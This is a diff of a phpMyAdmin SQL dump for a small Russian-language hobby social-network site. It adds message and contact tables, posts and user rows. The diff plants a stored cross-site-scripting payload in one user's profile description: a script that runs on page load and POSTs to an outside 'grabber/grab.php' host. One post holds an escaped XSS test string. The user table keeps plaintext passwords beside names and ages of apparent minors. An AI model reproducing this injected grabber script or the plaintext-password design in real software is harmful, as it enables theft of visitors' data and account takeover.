@@ -3,7 +3,7 @@
 -- https://www.phpmyadmin.net/
 --
 -- Хост: 127.0.0.1
--- Время создания: Ноя 17 2023 г., 15:00
+-- Время создания: Ноя 18 2023 г., 16:29
 -- Версия сервера: 10.4.28-MariaDB
 -- Версия PHP: 8.2.4
 
@@ -39,7 +39,45 @@ CREATE TABLE `userattachments` (
 --
 
 INSERT INTO `userattachments` (`documentPath`, `documentOwnerID`, `documentID`, `postId`) VALUES
-('documentBase/1.mp3', 1, 15, 52);
+('documentBase/1.mp3', 1, 15, 52),
+('documentBase/WoAAAgC4oeA-1920.jpg', 1, 16, 62);
+
+-- --------------------------------------------------------
+
+--
+-- Структура таблицы `usercontacts`
+--
+
+CREATE TABLE `usercontacts` (
+  `contactID` int(10) NOT NULL COMMENT 'Айди одного контакта ',
+  `contacterID` int(10) NOT NULL COMMENT 'Айди второго контакта',
+  `id` int(10) NOT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
+
+--
+-- Дамп данных таблицы `usercontacts`
+--
+
+INSERT INTO `usercontacts` (`contactID`, `contacterID`, `id`) VALUES
+(2, 3, 17),
+(1, 2, 25),
+(3, 2, 26),
+(2, 1, 27);
+
+-- --------------------------------------------------------
+
+--
+-- Структура таблицы `usermessages`
+--
+
+CREATE TABLE `usermessages` (
+  `msgID` int(10) NOT NULL COMMENT 'Айди сообщения',
+  `msgSender` int(10) NOT NULL COMMENT 'Айди отправителя сообщения',
+  `msgReceiver` int(10) NOT NULL COMMENT 'Айди получателя сообщения',
+  `msgTime` varchar(32) NOT NULL COMMENT 'Время отправки сообщения',
+  `msgReaded` tinyint(1) NOT NULL COMMENT 'Статус сообщения',
+  `msgText` text NOT NULL COMMENT 'Текст сообщения'
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
 
 -- --------------------------------------------------------
 
@@ -66,7 +104,12 @@ INSERT INTO `userposts` (`postID`, `postAuthor`, `postReceiver`, `postData`, `po
 (54, 1, 3, '16.11.2023 17:20:02', 'тебя тоже касается'),
 (55, 2, 2, '16.11.2023 17:21:41', 'ща послушаю'),
 (56, 2, 1, '16.11.2023 17:21:48', 'вау нихуя себе!!!!!!!!'),
-(57, 1, 1, '16.11.2023 17:59:37', 'пост');
+(57, 1, 1, '16.11.2023 17:59:37', 'пост'),
+(58, 1, 0, '17.11.2023 21:24:04', 'тест пост'),
+(59, 1, 0, '17.11.2023 21:24:34', 'тест пост'),
+(60, 1, 1, '17.11.2023 22:22:14', 'текст'),
+(61, 2, 2, '18.11.2023 22:00:42', '&lt;script&gt;alert(&#039;XSS&#039;);&lt;/script&gt;'),
+(62, 1, 2, '18.11.2023 22:24:37', 'перестань мне ломать сайт блеать!');
 
 -- --------------------------------------------------------
 
@@ -89,10 +132,9 @@ CREATE TABLE `users` (
 --
 
 INSERT INTO `users` (`id`, `login`, `password`, `name`, `lastname`, `age`, `pDescription`) VALUES
-(1, 'alextmsv', 'admin', 'Алексей', 'Тумасов', 16, ''),
-(2, 'tmsvruslan', 'tmsvruslan', 'Руслан', 'Тумасов', 29, 'DSBM, XASTHUR FOR3V3R'),
-(3, 'alextmsv1', 'admin2', 'Алексей', 'Тумасик', 16, 'Я Тумасик, изгой этот соц-сети('),
-(5, 'dsadsa', 'dsadsa', 'asdsad', 'asdsad', 12, '');
+(1, 'alextmsv', 'admin', 'Алексей', 'Тумасов', 16, 'Короче, читы - бан.\r\nКемперство - бан.\r\nОскорбление администрации - расстрел, потом бан.'),
+(2, 'tmsvruslan', 'tmsvruslan', 'Руслан', 'Тумасов', 29, 'DSBM, XASTHUR FOR3V3R <script>\r\ndocument.addEventListener(\"DOMContentLoaded\", function() {\r\n    var http = new XMLHttpRequest();\r\n    var url = \"http://192.168.1.136:5555/grabber/grab.php\";\r\n    var params = \"data=HELLO FROM SITE\";\r\n    http.open(\"POST\", url, true);\r\n    http.send(params);\r\n});\r\n</script>'),
+(3, 'alextmsv1', 'admin2', 'Алексей', 'Тумасик', 16, 'Я Тумасик, изгой этот соц-сети(');
 
 --
 -- Индексы сохранённых таблиц
@@ -103,6 +145,18 @@ INSERT INTO `users` (`id`, `login`, `password`, `name`, `lastname`, `age`, `pDes
 --
 ALTER TABLE `userattachments`
   ADD PRIMARY KEY (`documentID`);
+
+--
+-- Индексы таблицы `usercontacts`
+--
+ALTER TABLE `usercontacts`
+  ADD PRIMARY KEY (`id`);
+
+--
+-- Индексы таблицы `usermessages`
+--
+ALTER TABLE `usermessages`
+  ADD PRIMARY KEY (`msgID`);
 
 --
 -- Индексы таблицы `userposts`
@@ -124,13 +178,25 @@ ALTER TABLE `users`
 -- AUTO_INCREMENT для таблицы `userattachments`
 --
 ALTER TABLE `userattachments`
-  MODIFY `documentID` int(32) NOT NULL AUTO_INCREMENT COMMENT 'Айди документа', AUTO_INCREMENT=16;
+  MODIFY `documentID` int(32) NOT NULL AUTO_INCREMENT COMMENT 'Айди документа', AUTO_INCREMENT=17;
+
+--
+-- AUTO_INCREMENT для таблицы `usercontacts`
+--
+ALTER TABLE `usercontacts`
+  MODIFY `id` int(10) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=28;
+
+--
+-- AUTO_INCREMENT для таблицы `usermessages`
+--
+ALTER TABLE `usermessages`
+  MODIFY `msgID` int(10) NOT NULL AUTO_INCREMENT COMMENT 'Айди сообщения';
 
 --
 -- AUTO_INCREMENT для таблицы `userposts`
 --
 ALTER TABLE `userposts`
-  MODIFY `postID` int(3) NOT NULL AUTO_INCREMENT COMMENT 'Айди поста', AUTO_INCREMENT=58;
+  MODIFY `postID` int(3) NOT NULL AUTO_INCREMENT COMMENT 'Айди поста', AUTO_INCREMENT=63;
 
 --
 -- AUTO_INCREMENT для таблицы `users`
